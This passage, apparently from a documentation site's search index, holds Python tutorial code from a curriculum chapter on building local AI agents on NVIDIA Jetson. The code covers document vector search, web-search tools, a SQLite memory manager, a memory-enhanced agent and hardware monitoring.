     metadata={\"source\": file_path, \"type\": \"docx\"}\n            )]\n        except Exception as e:\n            print(f\"Error loading DOCX {file_path}: {e}\")\n            return []\n\n    def build_vectorstore(self, documents: List[Document]) -&gt; FAISS:\n        \"\"\"Build FAISS vectorstore for semantic search\"\"\"\n        if not documents:\n            raise ValueError(\"No documents provided\")\n\n        # Split documents into chunks\n        split_docs = self.text_splitter.split_documents(documents)\n        print(f\"Split {len(documents)} documents into {len(split_docs)} chunks\")\n\n        # Create vectorstore\n        self.vectorstore = FAISS.from_documents(split_docs, self.embeddings)\n        self.documents = split_docs\n\n        return self.vectorstore\n\n    def search_documents(self, query: str, k: int = 5) -&gt; List[Document]:\n        \"\"\"Semantic search across documents\"\"\"\n        if not self.vectorstore:\n            raise ValueError(\"Vectorstore not built. Call build_vectorstore first.\")\n\n        results = self.vectorstore.similarity_search(query, k=k)\n        return results\n\n    def save_vectorstore(self, path: str):\n        \"\"\"Save vectorstore to disk\"\"\"\n        if self.vectorstore:\n            self.vectorstore.save_local(path)\n\n    def load_vectorstore(self, path: str):\n        \"\"\"Load vectorstore from disk\"\"\"\n        self.vectorstore = FAISS.load_local(path, self.embeddings)\n\n# Usage example\ndoc_processor = JetsonDocumentProcessor()\n\n# Load documents from directory\ndocuments = doc_processor.load_directory(\"./documents\")\nprint(f\"Loaded {len(documents)} documents\")\n\n# Build vectorstore for semantic search\nvectorstore = doc_processor.build_vectorstore(documents)\n\n# Search documents\nresults = doc_processor.search_documents(\"machine learning optimization\", k=3)\nfor i, doc in enumerate(results):\n    print(f\"Result {i+1}: {doc.metadata['source']} - {doc.page_content[:200]}...\")\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#document-processing-tools-for-agents","title":"\ud83d\udd27 Document Processing Tools for Agents","text":"<pre><code>from langchain.tools import Tool\nfrom typing import Optional\n\nclass DocumentSearchTool:\n    \"\"\"Tool for semantic document search\"\"\"\n\n    def __init__(self, doc_processor: JetsonDocumentProcessor):\n        self.doc_processor = doc_processor\n\n    def search(self, query: str, num_results: int = 3) -&gt; str:\n        \"\"\"Search documents and return formatted results\"\"\"\n        try:\n            results = self.doc_processor.search_documents(query, k=num_results)\n\n            if not results:\n                return f\"No documents found for query: {query}\"\n\n            formatted_results = []\n            for i, doc in enumerate(results, 1):\n                source = doc.metadata.get('source', 'Unknown')\n                page = doc.metadata.get('page', '')\n                page_info = f\" (Page {page})\" if page else \"\"\n                content = doc.page_content[:300] + \"...\" if len(doc.page_content) &gt; 300 else doc.page_content\n\n                formatted_results.append(\n                    f\"Result {i}: {source}{page_info}\\n{content}\\n\"\n                )\n\n            return \"\\n\".join(formatted_results)\n\n        except Exception as e:\n            return f\"Error searching documents: {str(e)}\"\n\ndef create_document_tools(doc_processor: JetsonDocumentProcessor) -&gt; List[Tool]:\n    \"\"\"Create document-related tools for the agent\"\"\"\n    search_tool = DocumentSearchTool(doc_processor)\n\n    tools = [\n        Tool(\n            name=\"search_documents\",\n            func=search_tool.search,\n            description=\"Search through local documents using semantic similarity. \"\n                       \"Input should be a search query string. Returns relevant document excerpts.\"\n        ),\n        Tool(\n            name=\"list_document_sources\",\n            func=lambda x: \"\\n\".join(set(doc.metadata.get('source', 'Unknown') \n                                       for doc in doc_processor.documents)),\n            description=\"List all available document sources in the knowledge base.\"\n        )\n    ]\n\n    return tools\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#web-search-online-integration","title":"\ud83c\udf10 Web Search &amp; Online Integration","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#web-search-tools","title":"\ud83d\udd0d Web Search Tools","text":"<p>Integrate web search capabilities for real-time information retrieval:</p> <pre><code>import requests\nimport json\nfrom typing import List, Dict, Optional\nfrom urllib.parse import quote_plus\nfrom bs4 import BeautifulSoup\nfrom langchain.tools import Tool\nfrom langchain.utilities import GoogleSearchAPIWrapper, DuckDuckGoSearchAPIWrapper\n\nclass JetsonWebSearchTool:\n    \"\"\"Optimized web search for Jetson with multiple search engines\"\"\"\n\n    def __init__(self, search_engine: str = \"duckduckgo\"):\n        self.search_engine = search_engine\n\n        if search_engine == \"google\":\n            # Requires GOOGLE_API_KEY and GOOGLE_CSE_ID environment variables\n            try:\n                self.google_search = GoogleSearchAPIWrapper()\n            except Exception as e:\n                print(f\"Google Search setup failed: {e}\")\n                self.google_search = None\n\n        elif search_engine == \"duckduckgo\":\n            self.ddg_search = DuckDuckGoSearchAPIWrapper()\n\n    def search_web(self, query: str, num_results: int = 5) -&gt; str:\n        \"\"\"Search the web and return formatted results\"\"\"\n        try:\n            if self.search_engine == \"google\" and self.google_search:\n                results = self.google_search.run(query)\n                return self._format_google_results(results, num_results)\n\n            elif self.search_engine == \"duckduckgo\":\n                results = self.ddg_search.run(query)\n                return self._format_ddg_results(results, num_results)\n\n            else:\n                return self._fallback_search(query, num_results)\n\n        except Exception as e:\n            return f\"Web search error: {str(e)}\"\n\n    def _format_google_results(self, results: str, num_results: int) -&gt; str:\n        \"\"\"Format Google search results\"\"\"\n        # Google API returns formatted string, parse and limit\n        lines = results.split('\\n')\n        limited_results = lines[:num_results * 3]  # Approximate 3 lines per result\n        return '\\n'.join(limited_results)\n\n    def _format_ddg_results(self, results: str, num_results: int) -&gt; str:\n        \"\"\"Format DuckDuckGo search results\"\"\"\n        return results  # DuckDuckGo wrapper already formats results\n\n    def _fallback_search(self, query: str, num_results: int) -&gt; str:\n        \"\"\"Fallback search using direct HTTP requests\"\"\"\n        try:\n            # Simple DuckDuckGo instant answer API\n            url = f\"https://api.duckduckgo.com/?q={quote_plus(query)}&amp;format=json&amp;no_html=1&amp;skip_disambig=1\"\n            response = requests.get(url, timeout=10)\n            data = response.json()\n\n            result_text = []\n\n            # Abstract (instant answer)\n            if data.get('Abstract'):\n                result_text.append(f\"Summary: {data['Abstract']}\")\n                if data.get('AbstractURL'):\n                    result_text.append(f\"Source: {data['AbstractURL']}\")\n\n            # Related topics\n            if data.get('RelatedTopics'):\n                result_text.append(\"\\nRelated Information:\")\n                for i, topic in enumerate(data['RelatedTopics'][:num_results]):\n                    if isinstance(topic, dict) and 'Text' in topic:\n                        result_text.append(f\"{i+1}. {topic['Text']}\")\n                        if 'FirstURL' in topic:\n                            result_text.append(f\"   URL: {topic['FirstURL']}\")\n\n            return '\\n'.join(result_text) if result_text else f\"No results found for: {query}\"\n\n        except Exception as e:\n            return f\"Fallback search failed: {str(e)}\"\n\nclass WebContentExtractor:\n    \"\"\"Extract and summarize web page content\"\"\"\n\n    def __init__(self):\n        self.session = requests.Session()\n        self.session.headers.update({\n            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n        })\n\n    def extract_content(self, url: str, max_length: int = 2000) -&gt; str:\n        \"\"\"Extract main content from a web page\"\"\"\n        try:\n            response = self.session.get(url, timeout=10)\n            response.raise_for_status()\n\n            soup = BeautifulSoup(response.content, 'html.parser')\n\n            # Remove script and style elements\n            for script in soup([\"script\", \"style\"]):\n                script.decompose()\n\n            # Try to find main content areas\n            content_selectors = [\n                'article', 'main', '.content', '#content',\n                '.post-content', '.entry-content', '.article-content'\n            ]\n\n            content = \"\"\n            for selector in content_selectors:\n                elements = soup.select(selector)\n                if elements:\n                    content = ' '.join([elem.get_text() for elem in elements])\n                    break\n\n            # Fallback to body content\n            if not content:\n                body = soup.find('body')\n                content = body.get_text() if body else soup.get_text()\n\n            # Clean and truncate\n            content = ' '.join(content.split())  # Remove extra whitespace\n            if len(content) &gt; max_length:\n                content = content[:max_length] + \"...\"\n\n            return f\"Content from {url}:\\n{content}\"\n\n        except Exception as e:\n            return f\"Error extracting content from {url}: {str(e)}\"\n\ndef create_web_search_tools() -&gt; List[Tool]:\n    \"\"\"Create web search and content extraction tools\"\"\"\n    web_search = JetsonWebSearchTool(\"duckduckgo\")\n    content_extractor = WebContentExtractor()\n\n    tools = [\n        Tool(\n            name=\"web_search\",\n            func=lambda query: web_search.search_web(query, num_results=5),\n            description=\"Search the web for current information. \"\n                       \"Input should be a search query string. Returns web search results.\"\n        ),\n        Tool(\n            name=\"extract_web_content\",\n            func=lambda url: content_extractor.extract_content(url, max_length=1500),\n            description=\"Extract and summarize content from a web page. \"\n                       \"Input should be a valid URL. Returns the main content of the page.\"\n        )\n    ]\n\n    return tools\n\n# Usage example\nweb_tools = create_web_search_tools()\n\n# Test web search\nsearch_result = web_tools[0].func(\"latest NVIDIA Jetson updates 2024\")\nprint(\"Search Results:\")\nprint(search_result)\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#hybrid-search-local-web","title":"\ud83d\udd17 Hybrid Search: Local + Web","text":"<pre><code>class HybridSearchAgent:\n    \"\"\"Agent that combines local document search with web search\"\"\"\n\n    def __init__(self, doc_processor: JetsonDocumentProcessor):\n        self.doc_processor = doc_processor\n        self.web_search = JetsonWebSearchTool()\n        self.content_extractor = WebContentExtractor()\n\n    def intelligent_search(self, query: str, search_local: bool = True, search_web: bool = True) -&gt; Dict[str, Any]:\n        \"\"\"Perform intelligent search across local and web sources\"\"\"\n        results = {\n            \"query\": query,\n            \"local_results\": [],\n            \"web_results\": \"\",\n            \"summary\": \"\"\n        }\n\n        # Local document search\n        if search_local and self.doc_processor.vectorstore:\n            try:\n                local_docs = self.doc_processor.search_documents(query, k=3)\n                results[\"local_results\"] = [\n                    {\n                        \"source\": doc.metadata.get('source', 'Unknown'),\n                        \"content\": doc.page_content[:300] + \"...\" if len(doc.page_content) &gt; 300 else doc.page_content,\n                        \"metadata\": doc.metadata\n                    }\n                    for doc in local_docs\n                ]\n            except Exception as e:\n                results[\"local_error\"] = str(e)\n\n        # Web search\n        if search_web:\n            try:\n                web_content = self.web_search.search_web(query, num_results=3)\n                results[\"web_results\"] = web_content\n            except Exception as e:\n                results[\"web_error\"] = str(e)\n\n        # Generate summary\n        results[\"summary\"] = self._generate_search_summary(results)\n\n        return results\n\n    def _generate_search_summary(self, results: Dict[str, Any]) -&gt; str:\n        \"\"\"Generate a summary of search results\"\"\"\n        summary_parts = []\n\n        if results[\"local_results\"]:\n            summary_parts.append(f\"Found {len(results['local_results'])} relevant local documents.\")\n\n        if results[\"web_results\"]:\n            summary_parts.append(\"Retrieved current web information.\")\n\n        if not summary_parts:\n            return \"No results found from local or web sources.\"\n\n        return \" \".join(summary_parts)\n\n# Create hybrid search tool\ndef create_hybrid_search_tool(doc_processor: JetsonDocumentProcessor) -&gt; Tool:\n    \"\"\"Create a hybrid search tool that combines local and web search\"\"\"\n    hybrid_agent = HybridSearchAgent(doc_processor)\n\n    def hybrid_search(query: str) -&gt; str:\n        results = hybrid_agent.intelligent_search(query)\n\n        formatted_output = [f\"Search Query: {query}\\n\"]\n\n        # Local results\n        if results[\"local_results\"]:\n            formatted_output.append(\"\ud83d\udcda Local Documents:\")\n            for i, doc in enumerate(results[\"local_results\"], 1):\n                formatted_output.append(f\"{i}. {doc['source']}\")\n                formatted_output.append(f\"   {doc['content']}\\n\")\n\n        # Web results\n        if results[\"web_results\"]:\n            formatted_output.append(\"\ud83c\udf10 Web Results:\")\n            formatted_output.append(results[\"web_results\"])\n\n        return \"\\n\".join(formatted_output)\n\n    return Tool(\n        name=\"hybrid_search\",\n        func=hybrid_search,\n        description=\"Search both local documents and the web for comprehensive information. \"\n                   \"Input should be a search query string. Returns combined local and web results.\"\n    )\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#advanced-agent-memory-systems","title":"\ud83e\udde0 Advanced Agent Memory Systems","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#memory-architecture-for-jetson-agents","title":"\ud83d\udcbe Memory Architecture for Jetson Agents","text":"<p>Implement sophisticated memory systems to improve agent performance and context retention:</p> <pre><code>import sqlite3\nimport json\nimport pickle\nfrom datetime import datetime, timedelta\nfrom typing import List, Dict, Any, Optional\nfrom dataclasses import dataclass, asdict\nfrom langchain.memory import ConversationBufferMemory, ConversationSummaryMemory\nfrom langchain.schema import BaseMessage, HumanMessage, AIMessage\nfrom langchain.embeddings import SentenceTransformerEmbeddings\nfrom langchain.vectorstores import FAISS\nimport numpy as np\n\n@dataclass\nclass MemoryEntry:\n    \"\"\"Structure for memory entries\"\"\"\n    id: str\n    timestamp: datetime\n    content: str\n    memory_type: str  # 'conversation', 'fact', 'preference', 'task'\n    importance: float  # 0.0 to 1.0\n    embedding: Optional[List[float]] = None\n    metadata: Dict[str, Any] = None\n\nclass JetsonMemoryManager:\n    \"\"\"Advanced memory management system for Jetson AI agents\"\"\"\n\n    def __init__(self, db_path: str = \"agent_memory.db\", embedding_model: str = \"all-MiniLM-L6-v2\"):\n        self.db_path = db_path\n        self.embeddings = SentenceTransformerEmbeddings(\n            model_name=embedding_model,\n            model_kwargs={'device': 'cuda' if torch.cuda.is_available() else 'cpu'}\n        )\n\n        # Initialize database\n        self._init_database()\n\n        # Memory components\n        self.short_term_memory = ConversationBufferMemory(\n            memory_key=\"chat_history\",\n            return_messages=True,\n            max_token_limit=2000\n        )\n\n        self.episodic_memory = []  # Recent conversations\n        self.semantic_memory = None  # Long-term knowledge vectorstore\n        self.working_memory = {}  # Current task context\n\n        # Load existing semantic memory\n        self._load_semantic_memory()\n\n    def _init_database(self):\n        \"\"\"Initialize SQLite database for persistent memory\"\"\"\n        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)\n        self.conn.execute('''\n            CREATE TABLE IF NOT EXISTS memory_entries (\n                id TEXT PRIMARY KEY,\n                timestamp TEXT,\n                content TEXT,\n                memory_type TEXT,\n                importance REAL,\n                embedding BLOB,\n                metadata TEXT\n            )\n        ''')\n\n        self.conn.execute('''\n            CREATE TABLE IF NOT EXISTS user_preferences (\n                key TEXT PRIMARY KEY,\n                value TEXT,\n                timestamp TEXT\n            )\n        ''')\n\n        self.conn.execute('''\n            CREATE TABLE IF NOT EXISTS conversation_history (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                session_id TEXT,\n                timestamp TEXT,\n                role TEXT,\n                content TEXT,\n                metadata TEXT\n            )\n        ''')\n\n        self.conn.commit()\n\n    def add_memory(self, content: str, memory_type: str, importance: float = 0.5, metadata: Dict = None) -&gt; str:\n        \"\"\"Add a new memory entry\"\"\"\n        entry_id = f\"{memory_type}_{datetime.now().isoformat()}_{hash(content) % 10000}\"\n        timestamp = datetime.now()\n\n        # Generate embedding\n        embedding = self.embeddings.embed_query(content)\n\n        # Create memory entry\n        entry = MemoryEntry(\n            id=entry_id,\n            timestamp=timestamp,\n            content=content,\n            memory_type=memory_type,\n            importance=importance,\n            embedding=embedding,\n            metadata=metadata or {}\n        )\n\n        # Store in database\n        self.conn.execute('''\n            INSERT INTO memory_entries (id, timestamp, content, memory_type, importance, embedding, metadata)\n            VALUES (?, ?, ?, ?, ?, ?, ?)\n        ''', (\n            entry.id,\n            entry.timestamp.isoformat(),\n            entry.content,\n            entry.memory_type,\n            entry.importance,\n            pickle.dumps(entry.embedding),\n            json.dumps(entry.metadata)\n        ))\n        self.conn.commit()\n\n        # Update semantic memory\n        self._update_semantic_memory(entry)\n\n        return entry_id\n\n    def retrieve_memories(self, query: str, memory_types: List[str] = None, k: int = 5, min_importance: float = 0.0) -&gt; List[MemoryEntry]:\n        \"\"\"Retrieve relevant memories using semantic search\"\"\"\n        if not self.semantic_memory:\n            return []\n\n        # Semantic search\n        query_embedding = self.embeddings.embed_query(query)\n        similar_docs = self.semantic_memory.similarity_search_by_vector(query_embedding, k=k*2)\n\n        # Filter and rank results\n        relevant_memories = []\n        for doc in similar_docs:\n            metadata = doc.metadata\n\n            # Filter by memory type\n            if memory_types and metadata.get('memory_type') not in memory_types:\n                continue\n\n            # Filter by importance\n            if metadata.get('importance', 0) &lt; min_importance:\n                continue\n\n            # Reconstruct memory entry\n            entry = MemoryEntry(\n                id=metadata['id'],\n                timestamp=datetime.fromisoformat(metadata['timestamp']),\n                content=doc.page_content,\n                memory_type=metadata['memory_type'],\n                importance=metadata['importance'],\n                metadata=metadata.get('extra_metadata', {})\n            )\n            relevant_memories.append(entry)\n\n        # Sort by importance and recency\n        relevant_memories.sort(key=lambda x: (x.importance, x.timestamp), reverse=True)\n        return relevant_memories[:k]\n\n    def _update_semantic_memory(self, entry: MemoryEntry):\n        \"\"\"Update the semantic memory vectorstore\"\"\"\n        from langchain.schema import Document\n\n        doc = Document(\n            page_content=entry.content,\n            metadata={\n                'id': entry.id,\n                'timestamp': entry.timestamp.isoformat(),\n                'memory_type': entry.memory_type,\n                'importance': entry.importance,\n                'extra_metadata': entry.metadata\n            }\n        )\n\n        if self.semantic_memory is None:\n            self.semantic_memory = FAISS.from_documents([doc], self.embeddings)\n        else:\n            self.semantic_memory.add_documents([doc])\n\n    def _load_semantic_memory(self):\n        \"\"\"Load existing memories into semantic memory\"\"\"\n        cursor = self.conn.execute('SELECT * FROM memory_entries')\n        entries = cursor.fetchall()\n\n        if not entries:\n            return\n\n        documents = []\n        for entry in entries:\n            doc = Document(\n                page_content=entry[2],  # content\n                metadata={\n                    'id': entry[0],\n                    'timestamp': entry[1],\n                    'memory_type': entry[3],\n                    'importance': entry[4],\n                    'extra_metadata': json.loads(entry[6]) if entry[6] else {}\n                }\n            )\n            documents.append(doc)\n\n        if documents:\n            self.semantic_memory = FAISS.from_documents(documents, self.embeddings)\n\n    def update_conversation_memory(self, human_message: str, ai_message: str, session_id: str = \"default\"):\n        \"\"\"Update conversation memory with new exchange\"\"\"\n        timestamp = datetime.now()\n\n        # Add to short-term memory\n        self.short_term_memory.chat_memory.add_user_message(human_message)\n        self.short_term_memory.chat_memory.add_ai_message(ai_message)\n\n        # Store in database\n        self.conn.execute('''\n            INSERT INTO conversation_history (session_id, timestamp, role, content, metadata)\n            VALUES (?, ?, ?, ?, ?)\n        ''', (session_id, timestamp.isoformat(), 'human', human_message, '{}'))\n\n        self.conn.execute('''\n            INSERT INTO conversation_history (session_id, timestamp, role, content, metadata)\n            VALUES (?, ?, ?, ?, ?)\n        ''', (session_id, timestamp.isoformat(), 'ai', ai_message, '{}'))\n\n        self.conn.commit()\n\n        # Add to episodic memory if important\n        conversation_text = f\"Human: {human_message}\\nAI: {ai_message}\"\n        importance = self._calculate_importance(conversation_text)\n\n        if importance &gt; 0.3:  # Threshold for storing in long-term memory\n            self.add_memory(\n                content=conversation_text,\n                memory_type=\"conversation\",\n                importance=importance,\n                metadata={\"session_id\": session_id}\n            )\n\n    def _calculate_importance(self, content: str) -&gt; float:\n        \"\"\"Calculate importance score for memory content\"\"\"\n        importance_keywords = [\n            'important', 'remember', 'preference', 'like', 'dislike',\n            'always', 'never', 'favorite', 'hate', 'love', 'critical',\n            'urgent', 'deadline', 'appointment', 'meeting'\n        ]\n\n        content_lower = content.lower()\n        keyword_score = sum(1 for keyword in importance_keywords if keyword in content_lower)\n\n        # Normalize score\n        base_importance = min(keyword_score * 0.2, 0.8)\n\n        # Add length factor (longer conversations might be more important)\n        length_factor = min(len(content) / 1000, 0.2)\n\n        return min(base_importance + length_factor, 1.0)\n\n    def get_context_for_query(self, query: str, max_context_length: int = 1500) -&gt; str:\n        \"\"\"Get relevant context for a query from all memory sources\"\"\"\n        context_parts = []\n\n        # Get relevant memories\n        relevant_memories = self.retrieve_memories(query, k=3)\n        if relevant_memories:\n            context_parts.append(\"Relevant memories:\")\n            for memory in relevant_memories:\n                context_parts.append(f\"- {memory.content[:200]}...\")\n\n        # Get recent conversation context\n        recent_messages = self.short_term_memory.chat_memory.messages[-4:]  # Last 2 exchanges\n        if recent_messages:\n            context_parts.append(\"\\nRecent conversation:\")\n            for msg in recent_messages:\n                role = \"Human\" if isinstance(msg, HumanMessage) else \"AI\"\n                context_parts.append(f\"{role}: {msg.content[:150]}...\")\n\n        # Combine and truncate context\n        full_context = \"\\n\".join(context_parts)\n        if len(full_context) &gt; max_context_length:\n            full_context = full_context[:max_context_length] + \"...\"\n\n        return full_context\n\n    def save_user_preference(self, key: str, value: str):\n        \"\"\"Save user preference\"\"\"\n        timestamp = datetime.now().isoformat()\n        self.conn.execute('''\n            INSERT OR REPLACE INTO user_preferences (key, value, timestamp)\n            VALUES (?, ?, ?)\n        ''', (key, value, timestamp))\n        self.conn.commit()\n\n        # Also add to semantic memory\n        self.add_memory(\n            content=f\"User preference: {key} = {value}\",\n            memory_type=\"preference\",\n            importance=0.8,\n            metadata={\"preference_key\": key}\n        )\n\n    def get_user_preference(self, key: str) -&gt; Optional[str]:\n        \"\"\"Get user preference\"\"\"\n        cursor = self.conn.execute('SELECT value FROM user_preferences WHERE key = ?', (key,))\n        result = cursor.fetchone()\n        return result[0] if result else None\n\n    def cleanup_old_memories(self, days_to_keep: int = 30):\n        \"\"\"Clean up old, low-importance memories\"\"\"\n        cutoff_date = datetime.now() - timedelta(days=days_to_keep)\n\n        self.conn.execute('''\n            DELETE FROM memory_entries \n            WHERE timestamp &lt; ? AND importance &lt; 0.5\n        ''', (cutoff_date.isoformat(),))\n\n        self.conn.execute('''\n            DELETE FROM conversation_history \n            WHERE timestamp &lt; ?\n        ''', (cutoff_date.isoformat(),))\n\n        self.conn.commit()\n\n        # Rebuild semantic memory\n        self.semantic_memory = None\n        self._load_semantic_memory()\n\n# Usage example\nmemory_manager = JetsonMemoryManager()\n\n# Add some memories\nmemory_manager.add_memory(\n    \"User prefers concise explanations\",\n    \"preference\",\n    importance=0.9\n)\n\nmemory_manager.add_memory(\n    \"Discussed machine learning optimization techniques for Jetson\",\n    \"conversation\",\n    importance=0.7\n)\n\n# Retrieve relevant memories\nrelevant = memory_manager.retrieve_memories(\"optimization techniques\", k=3)\nfor memory in relevant:\n    print(f\"Memory: {memory.content} (Importance: {memory.importance})\")\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#memory-enhanced-agent-integration","title":"\ud83d\udd04 Memory-Enhanced Agent Integration","text":"<pre><code>class MemoryEnhancedAgent:\n    \"\"\"AI Agent with advanced memory capabilities\"\"\"\n\n    def __init__(self, llm, memory_manager: JetsonMemoryManager, tools: List[Tool]):\n        self.llm = llm\n        self.memory_manager = memory_manager\n        self.tools = {tool.name: tool for tool in tools}\n        self.conversation_count = 0\n\n    def process_query(self, query: str, session_id: str = \"default\") -&gt; str:\n        \"\"\"Process user query with memory-enhanced context\"\"\"\n        self.conversation_count += 1\n\n        # Get relevant context from memory\n        memory_context = self.memory_manager.get_context_for_query(query)\n\n        # Enhance prompt with memory context\n        enhanced_prompt = f\"\"\"\nYou are an AI assistant with access to conversation history and relevant memories.\n\nRelevant Context:\n{memory_context}\n\nCurrent Query: {query}\n\nPlease provide a helpful response. If you need to use tools, specify which tool and provide the input.\nAvailable tools: {', '.join(self.tools.keys())}\n\nResponse:\"\"\"\n\n        # Get LLM response\n        response = self.llm.invoke(enhanced_prompt)\n\n        # Check if tool use is needed\n        tool_response = self._handle_tool_use(response, query)\n        if tool_response:\n            response = tool_response\n\n        # Update memory with this conversation\n        self.memory_manager.update_conversation_memory(query, response, session_id)\n\n        # Extract and store any new facts or preferences\n        self._extract_and_store_information(query, response)\n\n        return response\n\n    def _handle_tool_use(self, response: str, original_query: str) -&gt; Optional[str]:\n        \"\"\"Handle tool usage based on LLM response\"\"\"\n        # Simple tool detection (in practice, use more sophisticated parsing)\n        for tool_name, tool in self.tools.items():\n            if tool_name.lower() in response.lower():\n                try:\n                    # Extract input for tool (simplified)\n                    tool_input = original_query  # In practice, extract specific input\n                    tool_result = tool.func(tool_input)\n\n                    # Generate final response with tool result\n                    final_prompt = f\"\"\"\nOriginal query: {original_query}\nTool used: {tool_name}\nTool result: {tool_result}\n\nPlease provide a comprehensive response based on the tool result:\"\"\"\n\n                    return self.llm.invoke(final_prompt)\n\n                except Exception as e:\n                    return f\"Error using {tool_name}: {str(e)}\"\n\n        return None\n\n    def _extract_and_store_information(self, query: str, response: str):\n        \"\"\"Extract and store important information from conversation\"\"\"\n        # Look for user preferences\n        preference_indicators = ['i prefer', 'i like', 'i want', 'i need', 'i always', 'i never']\n        query_lower = query.lower()\n\n        for indicator in preference_indicators:\n            if indicator in query_lower:\n                # Extract preference (simplified)\n                preference_text = query[query_lower.find(indicator):]\n                self.memory_manager.add_memory(\n                    content=f\"User stated: {preference_text}\",\n                    memory_type=\"preference\",\n                    importance=0.8\n                )\n                break\n\n        # Store important facts mentioned in response\n        if any(keyword in response.lower() for keyword in ['important', 'remember', 'note that']):\n            self.memory_manager.add_memory(\n                content=f\"Important information: {response[:300]}\",\n                memory_type=\"fact\",\n                importance=0.7\n            )\n\n# Create memory-enhanced agent\nmemory_manager = JetsonMemoryManager()\ndoc_processor = JetsonDocumentProcessor()  # From previous section\n\n# Combine all tools\nall_tools = (\n    create_document_tools(doc_processor) +\n    create_web_search_tools() +\n    [create_hybrid_search_tool(doc_processor)]\n)\n\n# Create the agent\nagent = MemoryEnhancedAgent(\n    llm=llm,  # Your LLM instance\n    memory_manager=memory_manager,\n    tools=all_tools\n)\n\n# Example conversation\nresponse1 = agent.process_query(\"I prefer concise explanations. Can you search for Jetson optimization techniques?\")\nprint(response1)\n\nresponse2 = agent.process_query(\"What did we discuss about optimization earlier?\")\nprint(response2)\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#jetson-specific-optimizations","title":"\u26a1 Jetson-Specific Optimizations","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#performance-optimization-for-edge-ai","title":"\ud83d\ude80 Performance Optimization for Edge AI","text":"<p>Optimize AI agents for Jetson's unique hardware constraints and capabilities:</p> <pre><code>import torch\nimport psutil\nimport subprocess\nimport threading\nimport time\nfrom typing import Dict, Any, Optional\nfrom dataclasses import dataclass\nfrom concurrent.futures import ThreadPoolExecutor\nimport gc\n\n@dataclass\nclass JetsonSystemInfo:\n    \"\"\"System information for Jetson optimization\"\"\"\n    gpu_memory_total: int\n    gpu_memory_free: int\n    cpu_usage: float\n    memory_usage: float\n    temperature: float\n    power_mode: str\n    jetson_model: str\n\nclass JetsonOptimizer:\n    \"\"\"Optimization utilities for Jetson AI agents\"\"\"\n\n    def __init__(self):\n        self.system_info = self.get_system_info()\n        self.optimization_settings = self._get_optimal_settings()\n\n        # Performance monitoring\n        self.performance_history = []\n        self.monitoring_active = False\n\n        # Memory management\n        self.memory_threshold = 0.85  # 85% memory usage threshold\n        self.cleanup_interval = 300  # 5 minutes\n\n        # Start background monitoring\n        self._start_monitoring()\n\n    def get_system_info(self) -&gt; JetsonSystemInfo:\n        \"\"\"Get current Jetson system information\"\"\"\n        try:\n            # GPU memory info\n            if torch.cuda.is_available():\n                gpu_memory_total = torch.cuda.get_device_properties(0).total_memory\n                gpu_memory_free = gpu_memory_total - torch.cuda.memory_allocated(0)\n            else:\n                gpu_memory_total = gpu_memory_free = 0\n\n            # CPU and system memory\n            cpu_usage = psutil.cpu_percent(interval=1)\n            memory_info = psutil.virtual_memory()\n            memory_usage = memory_info.percent / 100.0\n\n            # Temperature (Jetson-specific)\n            temperature = self._get_temperature()\n\n            # Power mode\n            power_mode = self._get_power_mode()\n\n            # Jetson model detection\n            jetson_model = self._detect_jetson_model()\n\n            return JetsonSystemInfo(\n                gpu_memory_total=gpu_memory_total,\n                gpu_memory_free=gpu_memory_free,\n                cpu_usage=cpu_usage,\n                memory_usage=memory_usage,\n                temperature=temperature,\n                power_mode=power_mode,\n                jetson_model=jetson_model\n            )\n\n        except Exception as e:\n            print(f\"Error getting system info: {e}\")\n            return JetsonSystemInfo(0, 0, 0.0, 0.0, 0.0, \"unknown\", \"unknown\")\n\n    def _get_temperature(self) -&gt; float:\n        \"\"\"Get Jetson temperature\"\"\"\n        try:\n            # Try different temperature sensors\n            temp_files = [\n                '/sys/class/thermal/thermal_zone0/temp',\n                '/sys/class/thermal/thermal_zone1/temp',\n                '/sys/devices/virtual/thermal/thermal_zone0/temp'\n            ]\n\n            for temp_file in temp_files:\n                try:\n                    with open(temp_file, 'r') as f:\n                        temp = float(f.read().strip()) / 1000.0  # Convert from millicelsius\n                        return temp\n                except FileNotFoundError:\n                    continue\n\n            return 0.0\n        except Exception:\n            return 0.0\n\n    def _get_power_mode(self) -&gt; str:\n        \"\"\"Get current Jetson power mode\"\"\"\n        try:\n            result = subprocess.run(['nvpmodel', '-q'], capture_output=True, text=True)\n            if result.returncode == 0:\n                for line in result.stdout.split('\\n'):\n                    if 'NV Power Mode' in line:\n                        return line.split(':')[-1].strip()\n            return \"unknown\"\n        except Exception:\n            return \"unknown\"\n\n    def _detect_jetson_model(self) -&gt; str:\n        \"\"\"Detect Jetson model\"\"\"\n        try:\n            with open('/proc/device-tree/model', 'r') as f:\n                model_info = f.read().strip()\n                if 'Orin' in model_info:\n                    return 'Jetson Orin'\n                elif 'Xavier' in model_info:\n                    return 'Jetson Xavier'\n                elif 'Nano' in model_info:\n                    return 'Jetson Nano'\n                else:\n                    return model_info\n        except Exception:\n            return \"unknown\"\n\n    def _get_optimal_settings(self) -&gt; Dict[str, Any]:\n        \"\"\"Get optimal settings based on Jetson model\"\"\"\n        model = self.system_info.jetson_model\n\n        if 'Orin' in model:\n            return {\n                'max_batch_size': 8,\n                'embedding_batch_size': 32,\n                'max_workers': 4,\n                'memory_map_threshold': 0.7,\n                'gpu_memory_fraction': 0.8\n            }\n        elif 'Xavier' in model:\n            return {\n                'max_batch_size': 4,\n                'embedding_batch_size': 16,\n                'max_workers': 2,\n                'memory_map_threshold': 0.75,\n                'gpu_memory_fraction': 0.7\n            }\n        else:  # Nano or other\n            return {\n                'max_batch_size': 2,\n                'embedding_batch_size': 8,\n                'max_workers': 1,\n                'memory_map_threshold': 0.8,\n                'gpu_memory_fraction': 0.6\n            }\n\n    def optimize_torch_settings(self):\n        